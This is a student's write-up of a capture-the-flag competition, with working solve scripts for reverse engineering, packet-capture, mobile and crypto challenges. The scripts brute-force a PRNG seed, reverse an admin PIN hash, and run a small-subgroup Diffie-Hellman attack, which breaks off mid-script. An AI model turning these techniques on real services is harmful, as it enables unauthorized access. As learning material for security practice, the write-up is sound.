# My Experience
I've consistently participated in CTFs every weekend in 2024, but this one stands out significantly. The scale and challenges presented an entirely new level of engagement.
Firstly, it was organized in a collaboration by Synchrony and CCoE (joint initiative of Data Security Council of India & Govt of Telangana). Furthermore, the significant prize pool, with a first-place reward of 1 lakh rupees, made this CTF a highly desirable target from the moment I learned about it.

### Round 1
The Qualifier Round consisted of a cybersecurity quiz. As a 4th-year Computer Science and Engineering student specializing in Cybersecurity, I found the questions relatively straightforward, covering core concepts I had thoroughly studied. However, I did not underestimate the main CTF round and allow my preparation to slacken. I recognized this as merely a qualifying stage.

### Preparation for Round 2
I had no idea what the level of challenges could be, all I knew were the categories:
`Reverse Engineering, Mobile Security, Cryptography, Exploitation, Web App Security, and more`
I was pretty confident in Reverse Engineering and Mobile Security, as someone who has decent experience with tools like IDA, Binary Ninja, Ghidra, Frida and JADX, I felt confident in my abilities to tackle challenges in these two domains.

I practiced Web App Security from various sources like PortSwigger Labs, TryHackMe etc.
For Cryptography, practicing from [CryptoHack](https://cryptohack.org/) felt fun and enough.
For Exploitation (pwn), the best website has always been considered https://pwn.college/ by many people, so that's where I spent my time.

### Round 2
Round 2 presented challenging problems.
While I attended the Grand Finale Kick-off Virtual Ceremony at 9:30 AM, insufficient sleep later hindered my focus throughout the day.
Despite this, I successfully solved the Android Mobile Challenge and all three Reverse Engineering challenges. Although demanding, these challenges were ultimately solvable through logical analysis.
I encountered difficulties with the first iOS mobile challenge due to the lack of an iOS system and Hopper Disassembler. I later successfully solved it using Binary Ninja.

By evening, I was experiencing significant fatigue. My initial plan was to remain awake throughout the 24-hour duration of the CTF, but insufficient sleep the previous night made this impossible. Recognizing the need for rest, I decided to take a nap. This proved to be a beneficial decision, as I awoke feeling refreshed and was able to approach the remaining challenges with focus and ease.

I stayed awake for the rest of the CTF, working on challenges right up until the last minute. Most of my time was spent on the final Forensics challenge, **Reckoning**, but unfortunately, I wasn’t able to solve it in the end. The web category was very tough, I spent a good amount of time on those challenges too but only managed to solve 1 out of 3.

The challenges I managed to solve (16 out of total 20):
- 3/3 in Rev
- 3/3 in Network
- 2/2 in Mobile
- 2/2 in Crypto
- 2/2 in Pwn
- 2/3 in DigitalForensics
- 1/2 in SecureCoding
- 1/3 in Web

Below are my detailed writeups for these challenges:

# Challenge Writeups
## Rev:
#### REWIND `Easy` `100 pts`
This is one of the first challenge I started with, and it did not feel like an Easy challenge. I think this should've been a Medium. Coming to the solution, first thing I did is analyze the binary in IDA. Here is the main function:
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned int v4; // eax
  int v5; // eax
  int v6; // eax
  size_t i; // [rsp+0h] [rbp-100h]
  size_t j; // [rsp+8h] [rbp-F8h]
  FILE *stream; // [rsp+10h] [rbp-F0h]
  size_t n; // [rsp+18h] [rbp-E8h]
  __int64 v11[10]; // [rsp+20h] [rbp-E0h]
  char ptr[48]; // [rsp+70h] [rbp-90h] BYREF
  char dest[48]; // [rsp+A0h] [rbp-60h] BYREF
  char s[40]; // [rsp+D0h] [rbp-30h] BYREF
  unsigned __int64 v15; // [rsp+F8h] [rbp-8h]

  v15 = __readfsqword(0x28u);
  v11[0] = (__int64)sub_1349;
  v11[1] = (__int64)sub_136A;
  v11[2] = (__int64)sub_137F;
  v11[3] = (__int64)sub_13A0;
  v11[4] = (__int64)sub_13C1;
  v11[5] = (__int64)sub_13D7;
  v11[6] = (__int64)sub_13F8;
  v11[7] = (__int64)sub_1419;
  v11[8] = (__int64)sub_142F;
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    n = fread(ptr, 1uLL, 0x22uLL, stream);
    ptr[n] = 0;
    fclose(stream);
    memcpy(dest, ptr, n);
    v4 = time(0LL);
    srand(v4);
    for ( i = 0LL; i < n; ++i )
    {
      v5 = rand();
      snprintf(s, 4uLL, "%d", (unsigned int)(v5 % 9));
      v6 = sub_1448(s);
      dest[i] = ((__int64 (__fastcall *)(_QWORD))v11[v6])((unsigned __int8)dest[i]);
    }
    for ( j = 0LL; j < n; ++j )
      printf("%02X ", (unsigned __int8)dest[j]);
    putchar(10);
    printf("Enter input string: ");
    if ( fgets(s, 35, stdin) && (s[strcspn(s, "\n")] = 0, n == strlen(s)) )
    {
      if ( !memcmp(ptr, s, n) )
        puts("thats a valid flag");
      else
        puts("Failure!");
      return 0LL;
    }
    else
    {
      puts("wrong length");
      return 1LL;
    }
  }
  else
  {
    perror("Error opening file");
    return 1LL;
  }
}
```
- The program opens flag.txt and stores its' contents in `ptr`.
- Then `rand()` function is called, seeded with the current time (`srand(time(0LL))`) to generate random values. These values are used in the transformation process.
- The transformations are performed on each byte of the flag (`ptr`) using the array of function pointers `v11`.
- The function to apply is determined by `sub_1448`, which calculates an index in the range [0, 8] based on a pseudo-random string generated for each byte.
- After the transformations, the program outputs the transformed flag in hexadecimal format.
- The user must input a string (`s`) that matches the original flag to pass the validation.

So to solve this, first we need the seed for srand(). This is because every time we connect to the netcat connection, we receive a new transformed flag, which can only be reversed if we have the seed. To get this, we can write a short python script, which connects to the service, and notes the exact time before connecting, captures the output, then prints the seed:
```python
import socket
import time

def main():
    host = "13.234.240.113" 
    port = 30227

    try:
        srand_time = int(time.time())
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            print("Connected!")
            # Send a random input
            random_input = "random_input\n"
            s.sendall(random_input.encode())
            output = b""
            while True:
                data = s.recv(4096)
                if not data:
                    break
                output += data
            print("\nOutput received:")
            print(output.decode(errors="ignore"))
        print(f"Timestamp for srand: {srand_time}")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
```
This gives us a Timestamp: `1736581523` with an output flag `CC 73 58 EC 82 C6 08 CB CC AD CC 4F 5B 54 05 29 1E 56 4F BF 5F BC 8B 55 E1 94 BC 4F 92 77 A0`.
However, it is important to note, this might not be the exact seed used. This is because it would have taken some time, after we captured the current time, and before the server actually ran `srand(time(0LL))`. To fix this, we will simply bruteforce the seed starting from the timestamp we have, as the difference would be in seconds (if any).

Now to solve this challenge, first we replicate the `sub_1448` function in python.
```c
v3 = 1
v4 = 0
while (*a1) {
  v3 = (v3 + *a1) % 0xFFF1;
  v4 = (v4 + v3) % 0xFFF1;
  a1++;
}
return (v3 | (v4 << 16)) % 9;
```
In Python:
```python
def sub_1448(a_str: str) -> int:
    v3 = 1
    v4 = 0
    for c in a_str:
        v3 = (v3 + ord(c)) % 0xFFF1
        v4 = (v4 + v3) % 0xFFF1
    return (v3 | (v4 << 16)) % 9
```

Let's analyze all the transformation functions:
- `sub_1349`: Swaps nibbles of the byte.
- `sub_136A`: Bitwise NOT.
- `sub_137F`: Rotate right by 3 bits.
- `sub_13A0`: Rotate left by 6 bits.
- `sub_13C1`: XOR with `0xAA`.
- Others apply modular arithmetic or bitwise shifts.

Now what we want, is the inverse of all the transformation functions, to reverse the transformed flag we have got.
- `sub_1349` is its own inverse (swapping nibbles twice gives original).
- `sub_136A` is its own inverse (NOT(NOT(a)) = a).
- Rotations: rotate-left-N is inverted by rotate-right-N.
- XOR with constant is its own inverse.
- (a + k) mod 256 is inverted by (a - k) mod 256.
- Multiply by 3 mod 256 is inverted by multiply by 171 (since 3*171=513 ≡ 1 mod 256).
```python
def inv_t0(a): # same as original
    return ((a << 4) & 0xF0) | ((a >> 4) & 0x0F)

def inv_t1(a): # same as original
    return (~a) & 0xFF

def rotate_left(a, n):
    a &= 0xFF
    return ((a << n) & 0xFF) | (a >> (8 - n))

def rotate_right(a, n):
    a &= 0xFF
    return (a >> n) | ((a << (8 - n)) & 0xFF)

def inv_t2(a):  # original is rotate-left-5, so inverse is rotate-right-5
    return rotate_right(a, 5)

def inv_t3(a):  # original is rotate-left-6, so inverse is rotate-right-6
    return rotate_right(a, 6)

def inv_t4(a):  # XOR with 0xAA
    return a ^ 0xAA

def inv_t5(a):  # (x + 7) mod 256 => inverse is (x - 7) mod 256
    return (a - 7) % 256

def inv_t6(a):  # same pattern as original (rotate-left-6), inverse is rotate-right-6
    return rotate_right(a, 6)

def inv_t7(a):  # (x + 85) mod 256 => inverse is (x - 85) mod 256
    return (a - 85) % 256

def inv_t8(a):  # multiply by 3 => inverse is multiply by 171 mod 256
    return (a * 171) % 256
```
Now we can write a complete script, to bruteforce the seed and perform the reverse transformations.
**Note:** We can get flag length as 31 chars by playing with the netcat service, as every other length returns with `wrong length`.
```python
import ctypes
libc = ctypes.CDLL("libc.so.6")

def sub_1448(a_str: str) -> int:
    v3 = 1
    v4 = 0
    for c in a_str:
        v3 = (v3 + ord(c)) % 0xFFF1
        v4 = (v4 + v3) % 0xFFF1
    return (v3 | (v4 << 16)) % 9

def inv_t0(a):
    return ((a << 4) & 0xF0) | ((a >> 4) & 0x0F)

def inv_t1(a):
    return (~a) & 0xFF

def rotate_left(a, n):
    a &= 0xFF
    return ((a << n) & 0xFF) | (a >> (8 - n))

def rotate_right(a, n):
    a &= 0xFF
    return (a >> n) | ((a << (8 - n)) & 0xFF)

def inv_t2(a):
    return rotate_right(a, 5)

def inv_t3(a):
    return rotate_right(a, 6)

def inv_t4(a):
    return a ^ 0xAA

def inv_t5(a):
    return (a - 7) % 256

def inv_t6(a):
    return rotate_right(a, 6)

def inv_t7(a):
    return (a - 85) % 256

def inv_t8(a):
    return (a * 171) % 256

inverse_funcs = [inv_t0, inv_t1, inv_t2, inv_t3, inv_t4, inv_t5, inv_t6, inv_t7, inv_t8]

obf_hex = "CC 73 58 EC 82 C6 08 CB CC AD CC 4F 5B 54 05 29 1E 56 4F BF 5F BC 8B 55 E1 94 BC 4F 92 77 A0"
obf_bytes = [int(x, 16) for x in obf_hex.split()]
assert len(obf_bytes) == 31

def try_seeds(start_seed, max_attempts):
    for possible_seed in range(start_seed, start_seed + max_attempts):
        libc.srand(possible_seed)

        orig = []
        for i in range(31):
            v5 = libc.rand()
            s = str(v5 % 9)
            idx = sub_1448(s)
            original_byte = inverse_funcs[idx](obf_bytes[i]) & 0xFF
            orig.append(original_byte)
        try:
            candidate_flag = bytes(orig).decode("utf-8")
        except UnicodeDecodeError:
            continue

        if candidate_flag.startswith("flag{"):
            return (possible_seed, candidate_flag)

    return None

if __name__ == "__main__":
    result = try_seeds(start_seed=1736581523, max_attempts=600)
    if result:
        seed_found, flag_found = result
        print(f"[+] Found a match at seed={seed_found}!")
        print(f"[+] Recovered flag: {flag_found}")
    else:
        print("[-] No valid flag found in the given range.")
```

And we got the flag:
```bash
[+] Found a match at seed=1736581523!
[+] Recovered flag: flag{9X43mfHmQPcxYHjXgtNKRg==}
```

#### More Than Meets the Eye `Medium` `300 pts`
This was a relatively easier challenge. All we had to is reverse the code and find the correct input.
The only tricky part was there were two different functions to reverse, and I didn't find where the second function was being called in main. Nonetheless, the reversing part was easy.
Reversing main:
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  __int64 v4; // rax
  int i; // [rsp+0h] [rbp-50h]
  int j; // [rsp+4h] [rbp-4Ch]
  __int64 v8[2]; // [rsp+10h] [rbp-40h]
  __int16 v9; // [rsp+20h] [rbp-30h]
  char s[24]; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v11; // [rsp+48h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  sub_1309(a1, a2, a3);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Enter an input please");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  __isoc23_scanf("%s", s);
  s[19] = 0;
  if ( strlen(s) == 18 )
  {
    for ( i = 0; i <= 18; ++i )
      s[i] ^= 0x20u;
    v8[0] = 0x524F7F45427F4F54LL;
    v8[1] = 0x7F4F547F544F4E7FLL;
    v9 = 17730;
    for ( j = 0; ; ++j )
    {
      if ( j > 17 )
      {
        puts("Right Text");
        malloc(0x1000uLL);
        sleep(1u);
        BUG();
      }
      if ( s[j] != *((_BYTE *)v8 + j) )
        break;
    }
    puts("Wrong Text");
    return 0xFFFFFFFFLL;
  }
  else
  {
    v4 = std::operator<<<std::char_traits<char>>(&std::cout, "Invalid String Length");
    std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
    return 1LL;
  }
}
```

We can find the correct input by reversing it step by step.
- The program expects an input string of exactly 18 characters (checked by `strlen(s) == 18`)
- The input string is processed in two steps:
    - Each character is XORed with 0x20 (`s[i] ^= 0x20u`)
    - The result is compared with values stored in v8 and v9
```python
def solve():
    # The hardcoded values as bytes
    v8_0 = 0x524F7F45427F4F54
    v8_1 = 0x7F4F547F544F4E7F
    v9 = 17730  # 0x4542 in hex
    
    # Convert to bytes
    values = []
    for i in range(8):
        values.append((v8_0 >> (i * 8)) & 0xFF)
    for i in range(8):
        values.append((v8_1 >> (i * 8)) & 0xFF)
    values.append(v9 & 0xFF)
    values.append((v9 >> 8) & 0xFF)
    
    # XOR each byte with 0x20 to get original input
    result = ''
    for v in values:
        result += chr(v ^ 0x20)
    
    return result[:18]  # Take only first 18 characters

print("The correct input is:", solve())
```
So we get:
The correct input is: `to_be_or_not_to_be`

Now the second function we had to reverse was sub_1350 in IDA. This was easy to find as there weren't many functions with a lot of stuff going on in them. This one did.
It performs multiple operations:
1. Outputs XOR-decoded characters.
2. Validates user input against several constraints.
Each pair of input bytes (`v4` to `v43`) must satisfy specific constraints.
- Example: `v4 + v5 == 155` and `v4 - v5 == 11`.
- These constraints can be solved algebraically:
    - From `v4 + v5 == 155` and `v4 - v5 == 11`:
        - $v4 = \frac{155 + 11}{2} = 83$
        - $v5 = \frac{155 - 11}{2} = 72$
    - Similarly, other pairs (`v6, v7`, etc.) must be solved.
```python
def solve_constraints():
    constraints = [
        (155, 11),
        (96, 0),
        (202, 12),
        (159, -49),
        (168, -64),
        (178, 12),
        (216, 8),
        (165, -63),
        (196, 6),
        (191, -17),
        (221, -11),
        (147, 43),
        (216, 0),
        (195, -5),
        (107, -3),
        (203, -13),
        (221, -11),
        (215, -13),
        (213, -19),
        (231, 3),
    ]
    result = []
    for total, diff in constraints:
        x = (total + diff) // 2
        y = (total - diff) // 2
        result.append((x, y))
    return result

def main():
    # Decoded `v2`
    v2 = [116, 122, 101, 118, 51, 114, 51, 117, 118, 118, 119, 113, 114, 112, 120]
    decoded_v2 = "".join(chr(c ^ 0x13) for c in v2)
    print(f"Decoded v2: {decoded_v2}")

    # Decoded `v3`
    v3 = "g{r}x3j|f"
    decoded_v3 = "".join(chr(ord(c) ^ 0x13) for c in v3)
    print(f"Decoded v3: {decoded_v3}")

    # Solve constraints
    solution = solve_constraints()
    input_values = [chr(x) for pair in solution for x in pair]
    input_values.append('e')  # v44 == 101
    print(f"Solved input: {''.join(input_values)}")


if __name__ == "__main__":
    main()
```
Decoded v2: `give a feedback`
Decoded v3: `thank you`
Solved input: `SH00k_7h4t_Sph3re_Whit_4ll_d47_literature`

Giving the two inputs `to_be_or_not_to_be` and `SH00k_7h4t_Sph3re_Whit_4ll_d47_literature` to the netcat service gave us the flag.

#### Blindness `Hard` `500 pts`
This challenge was very interesting, there was no single binary for us to reverse. Instead, we had to connect to a service, which gave us random strings.
During initial analysis, I pasted these strings on Cyberchef, and it instantly decoded them with base64, then applied Gunzip decompression, to give us an ELF file.
<br><img src='Pasted image 20250114164056.png'>
It mentions in the service, that we have to find the correct password for this binary. Like this, we have to solve 60 different binaries, reply with their passwords, in under 60 seconds.
Now the first thing I did, is that I applied strings to the first binary I got, and got this:
```
mEb7q9XGYLnDQRiTt4uO
.shstrtab
.text
.data
.bss
```
Now, it made it pretty obvious, that the first string is the password. Submitting it gave correct solution too. I tried it for another binary, and it worked once again with similar looking strings!

So the solution was simple:
1. Get the initial string.
2. Decode it with base64.
3. Apply Gunzip decompression.
4. Apply strings command, the first string is the password.
5. Submit the password for all the 60 binaries, and solve the challenge!
I wrote the script for it, ran it, but it stopped...gave incorrect password after getting a few correct solutions. Running it multiple times, it was stopping after a few correct passwords everytime.

I investigated it deeply, and for a long time I thought the problem was with special characters in the password, then maybe I wrote the script incorrectly, but that wasn't the issue. Finally, I had to investigate by reversing why my script was failing for some binaries.

Looking into the decompiled output in IDA, the issue was clear, the string was begin XORed with another value, mostly 1 or 3, and the resultant output was the correct password. This was happening only for a few binaries, and that is why script was failing after getting a few correct passwords.

This put me into a deep think on how to solve this challenge, I thought maybe we can use some automatic decompiler in python, but that seemed too complicated and might not even fit the 1s per binary requirement. What I did next is, manual hex analysis of the binaries.

As per my observation, it was clear that we get only two types of binaries, one in which the first string is the password, other in which the first string is XORed with something, which becomes the password. I opened multiple binaries of both the types in https://hexed.it/ to see their differences:
<br><img src='Pasted image 20250115015112.png'>

Both type of binaries were almost  same, but there was only one part which was different:
`xor.elf`:
<br><img src='Pasted image 20250115015242.png'>

`noxor.elf`:
<br><img src='Pasted image 20250115015544.png'>

These were my observations:
- The string which I considered as the correct password initially, was always starting at `0x2000` in both the binaries and always had a length of 20 chars.
- In binaries without XOR operation, the next string i.e. `.shstrtab` start after exactly two null bytes.
- In binaries with XOR operation, the next string i.e. `.shstrtab` start after three bytes, in which 1st and 3rd are null, but 2nd is the value of the XOR key.

This made the solution very clear:
1. Get the original 20 char string from the position `0x2000` (8192 in decimal).
2. Find the byte exactly one space after previous string ends.
3. If it is 0, the original string is the password, if not, xor the byte's value with the string to get the password!
Here are these steps implemented in Python:
```python
import base64
import gzip

def processing(encoded_data, min_length=4):
    try:
        decoded_bytes = base64.b64decode(encoded_data)
        decompressed_bytes = gzip.decompress(decoded_bytes)
        if isinstance(decompressed_bytes, bytes):
            decompressed_data = decompressed_bytes.decode("latin1")
        originalstr = decompressed_data[8192:8192+20]
        xorif = ord(decompressed_data[8192+21:8192+22])
        if xorif == 0:
            return originalstr
        else:
            xor = xorif
            result = ""
            for c in originalstr:
                result += chr(ord(c) ^ xor)
            return result
    except Exception as e:
        print(f"An error occurred during processing: {e}")
        return None
```

Now we simply had to connect this function to our main script, and implement automatic retrieval and sending and get the flag:
```python
from pwn import *
import re
import base64
import gzip

def processing(encoded_data, min_length=4):
    try:
        decoded_bytes = base64.b64decode(encoded_data)
        decompressed_bytes = gzip.decompress(decoded_bytes)
        if isinstance(decompressed_bytes, bytes):
            decompressed_data = decompressed_bytes.decode("latin1")
        originalstr = decompressed_data[8192:8192+20]
        xorif = ord(decompressed_data[8192+21:8192+22])
        if xorif == 0:
            return originalstr
        else:
            xor = xorif
            result = ""
            for c in originalstr:
                result += chr(ord(c) ^ xor)
            return result
    except Exception as e:
        print(f"An error occurred during processing: {e}")
        return None

# Connect to the remote service
conn = remote("13.234.240.113", 31701)
for i in range(59):
    print(i)
    full_data = conn.recvuntil(b'password: ').decode('utf-8')
    print(full_data)
    match = re.search(r"b'(.*?)'", full_data)
    the_elf = match.group(1).encode()
    password = processing(the_elf)
    print(password)
    conn.sendline(password.encode())

conn.interactive()
```

## Network:
#### Ping of Secrets `Easy` `100 pts`
The challenge name was the biggest giveaway for this. The mention of `Ping` means that there is something lying in the ICMP packets.

I applied the icmp expression in Wireshark to view all those packets. And interestingly, all of them were carrying 1 byte data exactly. Also interestingly, this data also had the values `f`, `{`, `}` etc. (in random order), which made it obvious that these data were characters of the flag.
The only issues was that it seemed random, I originally extracted them in the order of their number which I was not able to deduce. Playing with Wireshark, when I sorted them by Increasing Timestamps, I got the proper format of `flag{` from the topmost packets. So I just extracted them based on that:
```python
import pyshark

def read_pcap_and_print_icmp_data(pcap_file):
    try:
        cap = pyshark.FileCapture(pcap_file, keep_packets=False)
        print("Reading packets and extracting ICMP data...")
        icmp_packets = []
        for packet in cap:
            try:
                if hasattr(packet, 'icmp') and hasattr(packet.icmp, 'data'):
                    icmp_data = packet.icmp.data
                    ascii_data = bytes.fromhex(icmp_data.replace(':', '')).decode('utf-8', errors='replace')
                    timestamp = float(packet.sniff_timestamp)
                    icmp_packets.append((timestamp, ascii_data))
            except AttributeError:
                pass

        # Sort packets by timestamp
        icmp_packets.sort(key=lambda x: x[0])
        for timestamp, ascii_data in icmp_packets:
            print(ascii_data,end="")

    except FileNotFoundError:
        print(f"File not found: {pcap_file}")
    except Exception as e:
        print(f"An error occurred: {e}")

pcap_file = 'traffic.pcap'
read_pcap_and_print_icmp_data(pcap_file)
```
Then got the flag:
```
Reading packets and extracting ICMP data...
flag{gfbLgsw7S128dz0kmCC8Lg==}
```

#### Sn1ff3r `Medium` `300 pts`
First thing I always do after opening a packet capture file in Wireshark, is look at the TCP and UDP streams. Most of the UDP streams for this capture were empty, except the last two:
```
Hello, are you ready to receive the data?Its very crucial for the mission. I'll be sending it over only once.Until we meet againHeres the key aDdWZDNXa0xxWjh4QjJmRTFZMG1QOUo1dFIyTjB2UUs=dont forget this too OXBGcVQ0Y0o4THdYM2RLMg==Good luck
```

```
Yes, ready to receive the data.There are a lot of guards out here ill try to get it done.the mission shall be done
```
We get two base64 encoded strings, `aDdWZDNXa0xxWjh4QjJmRTFZMG1QOUo1dFIyTjB2UUs=` and `OXBGcVQ0Y0o4THdYM2RLMg==`, which when decoded, were of length 32 and 16 bytes respectively. Experience was enough to conclude that these were most likely Key and IV for AES respectively.

Next while scrolling through the packets in Wireshark, I suddenly see a lot of ICMP packets carrying a bunch of data appeared. I applied the icmp expression to filter those packets. While most of the packets were from random source and destination, all ICMP packets after number 560, had the same source and destination, and were carrying a bunch of data. So this is most likely the data we have to decrypt.
I extracted it using a python script, since the packets carrying data were of length 178, except the last one which was 132, I decided to filter them by applying a length check of 130:
```python
import pyshark

def read_pcap_and_store_icmp_data(pcap_file, output_file):
    try:
        cap = pyshark.FileCapture(pcap_file)
        print("Reading packets and extracting ICMP data...")
        icmp_data_combined = ""
        for packet in cap:
            try:
                if hasattr(packet, 'icmp') and int(packet.length) > 130:
                    if hasattr(packet.icmp, 'data'):
                        icmp_data = packet.icmp.data
                        icmp_data_combined += icmp_data.replace(':', '')
            except AttributeError:
                pass

        # Write the combined ICMP data to a file
        with open(output_file, 'w') as file:
            file.write(icmp_data_combined)
        print(f"ICMP data stored in {output_file}")

    except FileNotFoundError:
        print(f"File not found: {pcap_file}")
    except Exception as e:
        print(f"An error occurred: {e}")

pcap_file = 'traffic.pcap'
output_file = 'icmp_data.txt'
read_pcap_and_store_icmp_data(pcap_file, output_file)
```

Now, I simply decrypted the data in Cyberchef and got the flag:
<br><img src='Pasted image 20250115032613.png'>

#### Sinister Network `Hard` `500 pts`
This challenge turned out to be much simpler than I initially anticipated, largely because I identified the right approach from the very start!
After opening the packet capture in Wireshark, I followed the TCP streams, and most of them were Rick Roll Links. Going through all of them did not seem feasible, because of the large amount of packets.

So, I used the following expression in Wireshark to search for flag keyword: `frame contains "flag"`
And I found some interesting packets:
<br><img src='Pasted image 20250115033706.png'>

I was going through the packets next to these packets, but I was not able to find anything for a while. Interestingly, all three of these packets with the flag keyword were using the FTP Protocol. So I looked at all the ftp packets:
<br><img src='Pasted image 20250115033914.png'>

And this is everything that I needed to solve this challenge!
- `USER ilovefernet` and `PASS encryption` gave us a hint that this might be the Fernet encryption/decryption.
- The flag_chunks were the pieces of encrypted + encoded flag.
- The random string `OFgtX2lRQ21iZ2x0M193YTRaTlV0S2FfYlQyenlwOHFPSDVfa0pBYVFVST0=` was base64 encoded, which when decoded:`8X-_iQCmbglt3_wa4ZNUtKa_bT2zyp8qOH5_kJAaQUI=` gave a perfect length key for Fernet Decryption.

So, I put these values in [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Fernet_Decrypt('8X-_iQCmbglt3_wa4ZNUtKa_bT2zyp8qOH5_kJAaQUI%3D')&input=WjBGQlFVRkJRbTVuYm5oWmFVUjJVV1V5VDJwak9FcE1ZVzlTTkVVeFpVZHdUelZYWlRaUFRRPT1WMUJWTXpsV2NFVkZNa3RYZWpsTlFWSjFXa1p2YjNWM09DMTVjSE56TmpreGVXWXlXV015T1E9PVl6aFNhbEZ6VUV4d2RrZFBaREkzYzJVNE9VbEVlR1JoTTJsdE1UUk1SR2cxWkRGMFExQmpQUT09) to get the flag:
<br><img src='Pasted image 20250115034420.png'>

## Mobile:
#### Calcios `Easy` `100 pts`
I almost gave up on this challenge, because I did not have access to any iOS system to test the app and did not have Hopper Disassembler to properly view the decompiled code.
The code generated by IDA did not help me to get the solution, in the end BinaryNinja did the trick.

So initially, after renaming the `.ipa` file to `.zip`, I applied strings command on the main Calculator binary, and I got this: `https://challXXX.eng.run/flag/config?id=`
So this much was clear, we had to find the value of id which will give us the correct flag!

Searching this in decompiled output of IDA, I was able to find where this string was used. It was being modified and called in a `..SendRequest..` function, when the user presses a button 10 times. How and what was the modification was unclear, and for a while I couldn't find the exact value if id.
Finally, I tried BinaryNinja and could get how this id was being fetched from the `int64_t _$s10Calculator11AppDelegateC11sendRequestyyFTf4d_n()` function:
```c
_objc_msgSend(_objc_opt_self(_OBJC_CLASS_$_NSBundle), "mainBundle")
int64_t x0_5 = _objc_retainAutoreleasedReturnValue()
int64_t x0_6 = _$sSS10FoundationE19_bridgeToObjectiveCSo8NSStringCyF(0x69666e6f43707041, -0x14ffffffffbbb699)
_objc_msgSend(x0_5, "objectForInfoDictionaryKey:", x0_6)
int64_t x0_8 = _objc_retainAutoreleasedReturnValue()
_objc_release(x0_5)
_objc_release(x0_6)
```
**`_$sSS10FoundationE19_bridgeToObjectiveCSo8NSStringCyF(0x69666e6f43707041, -0x14ffffffffbbb699)`**:
- **Hex Value**: `0x69666e6f43707041`
- **Little Endian Conversion**:
    - Breakdown: `0x41` ('A'), `0x70` ('p'), `0x70` ('p'), `0x43` ('C'), `0x6f` ('o'), `0x6e` ('n'), `0x66` ('f'), `0x69` ('i')
    - Combined: `"AppConfi"`
    - Likely Intended Key: `"AppConfig"`
The function retrieves the value associated with the key `"AppConfig"` from `Info.plist`!
Then it checks if this exists, and does some other stuff...but it was clear that this was the `id` we were looking for!

I used https://plist-viewer.com/ to view `Info.plist`:
<br><img src='Pasted image 20250115041533.png'>

The `AppConfigID`, which had the value `6168862` was our id!
https://challXXX.eng.run/flag/config?id=6168862 (with the correct instance address) gave us the flag!

#### SecureBank `Medium` `300 pts`
I decompiled the apk using JADX and made several observations:
- The deployment URL is being used to form this: `depl_URL/user/id?secret=pin` where we have to replace with the correct `id` and `pin`.
- There is a `bankDB.db` in assets which when viewed (using https://inloop.github.io/sqlite-viewer/) shows us details of all the customers.
- While we can get the `id` of the admin user, the PIN of everyone is hashed and stored.
- The hashed value was just a number, so this wasn't a well-known hashing algorithm like MD5.

Since we need to input the correct PIN while logging in, we find a custom hash function in `customer_login_page` class:
```java
public static Long hash(Long l) {
    Long valueOf = Long.valueOf(((l.longValue() & 2863311530L) >>> 1) | ((l.longValue() & 1431655765) << 1));
    Long valueOf2 = Long.valueOf(((valueOf.longValue() & 3435973836L) >>> 2) | ((valueOf.longValue() & 858993459) << 2));
    Long valueOf3 = Long.valueOf(((valueOf2.longValue() & 4042322160L) >>> 4) | ((valueOf2.longValue() & 252645135) << 4));
    Long valueOf4 = Long.valueOf(((valueOf3.longValue() & 4278255360L) >>> 8) | ((valueOf3.longValue() & 16711935) << 8));
    return Long.valueOf((valueOf4.longValue() >>> 16) | (valueOf4.longValue() << 16));
}
```

So we have the hashed PIN of admin, `43431626549120`, now we have to reverse the hash function to get the value of the original PIN.

The hash function uses a series of masks and bit shifts to swap pairs of bits. This particular bit-shuffling hash is its own inverse, because each step is an `involution`, which means calling the same hash function again on the hashed value will return the original PIN. I only had to make slight changes for the long value conversion problems:
```java
public class Main {
    public static Long hash(Long l) {
        Long valueOf = ((l & 2863311530L) >>> 1) | ((l & 1431655765L) << 1);
        Long valueOf2 = ((valueOf & 3435973836L) >>> 2) | ((valueOf & 858993459L) << 2);
        Long valueOf3 = ((valueOf2 & 4042322160L) >>> 4) | ((valueOf2 & 252645135L) << 4);
        Long valueOf4 = ((valueOf3 & 4278255360L) >>> 8) | ((valueOf3 & 16711935L) << 8);
        return ((valueOf4 & 4294901760L) >>> 16) | ((valueOf4 & 65535L) << 16);
    }

    public static void main(String[] args) {
        long hashedValue = 43431626549120L;
        long originalPin = hash(hashedValue);
        System.out.println("Original PIN from hash " + hashedValue + " is: " + originalPin);
    }
}
```
Original PIN from hash 43431626549120 is: `31733100`
Using this we can form the correct deployment URL and get the flag!

## Crypto:
#### Groups `Medium` `300 pts`
Luckily, I had experienced with a very similar challenge previously so I knew exactly what to do. In this challenge we perform the [Small Subgroup Confinement Attack](https://crypto.stackexchange.com/questions/27584/small-subgroup-confinement-attack-on-diffie-hellman).

- Because p is prime, $\mathbb{Z}_p^*$​ (the multiplicative group of integers modulo `p`) has order `p−1`, which is not prime. This means that there exist subgroups of smaller order.
- If we can force the shared secret to lie in a _small subgroup_, then there are few possible values of that secret—i.e., we can brute-force them.

Steps to exploit:
1. Find a small factor `w` of `p-1`
2. Once we have `w`, we set  $k = \frac{p-1}{w}$
3. We compute $A = g^k \mod p$. Because `w` is a factor of `p−1`, `A` ends up having a _subgroup_ of size `w`.
4. After server computes $S = A^b$ and replies, we enumerate all possible values of shared secret `S` on our end.
```python
from pwn import *
from Crypto.Util.number import long_to_bytes
import hashlib
from Crypto.Cipher import AES

conn = remote('13.234.240.113', 32093)
response = conn.recvuntil("🔑 Enter your public key:").decode()
g = int(response.split("g: ")[1].split("\n")[0])
p = int(response.split("p: ")[1].split("\n")[0])

# Calculate a small divisor w of p-1
w = 2
while True:
    if (p - 1) % w == 0 and w != 2:
        break
    w += 1

# Calculate k as (p-1) // w
k = (p - 1) // w

# Compute the public key
public_key = pow(g, k, p)
conn.sendline(str(public_key))

response = conn.recvuntil("🚩 Encrypted Flag:").decode()
ciphertext_hex = conn.recvline().strip().decode()
ciphertext = bytes.fromhex(ciphertext_hex)

